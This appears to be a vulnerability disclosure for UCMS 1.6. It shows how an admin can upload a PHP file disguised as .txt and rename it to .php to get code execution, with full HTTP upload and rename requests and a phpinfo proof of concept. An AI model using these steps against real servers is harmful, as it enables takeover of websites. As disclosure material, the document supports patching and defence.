## Arbitrary code execution vulnerability exists in UCMS 1.6

vendor: http://uuu.la/

Download link for UCMS-1.6 installation package: http://uuu.la/uploadfile/file/ucms_1.6.zip

Log in to the backend and click File Management

![image](https://user-images.githubusercontent.com/54017627/161387511-0f14e60c-4589-4b2c-8240-ced3f676fb61.png)

Click Select File-> Select 1.txt File, and then click upload

The file content of 1.txt is "<? php phpinfo ();? >"

![image](https://user-images.githubusercontent.com/54017627/161387536-5d37274a-2dbd-4d3a-8548-079c97d3f4c5.png)

```sql
POST /ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6 HTTP/1.1
Host: 192.168.1.101
Content-Length: 308
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.101
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOUdBWLlxxZUw6B5Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close

------WebKitFormBoundaryOUdBWLlxxZUw6B5Q
Content-Disposition: form-data; name="uuu_token"

8945ab62
------WebKitFormBoundaryOUdBWLlxxZUw6B5Q
Content-Disposition: form-data; name="uploadfile"; filename="1.txt"
Content-Type: text/plain

<?php phpinfo(); ?>
------WebKitFormBoundaryOUdBWLlxxZUw6B5Q--
```

Place the mouse over the 1.txt line and choose to rename it and rename it to 1.php

![image](https://user-images.githubusercontent.com/54017627/161387687-a7d5b662-4cc3-4716-9f0d-fee101be3f3e.png)

![image](https://user-images.githubusercontent.com/54017627/161387750-2168f124-037e-46c3-919d-6f75db0c16f3.png)

```
GET /ucms_1.6/ucms/index.php?do=sadmin_file&uuu_token=8945ab62&dir=/ucms_1.6&dirname=/ucms_1.6/&oldname=1.txt&newname=1.php HTTP/1.1
Host: 192.168.1.101
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close
```
We revisit the file management and find that the renaming has been successful.

![image](https://user-images.githubusercontent.com/54017627/161387783-891cfd16-b965-4c54-a8de-750fb7196d51.png)

We accessed the directory of the 1.php file from the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/161387865-87d0ca0f-2ee1-4e54-8462-646776446c20.png)
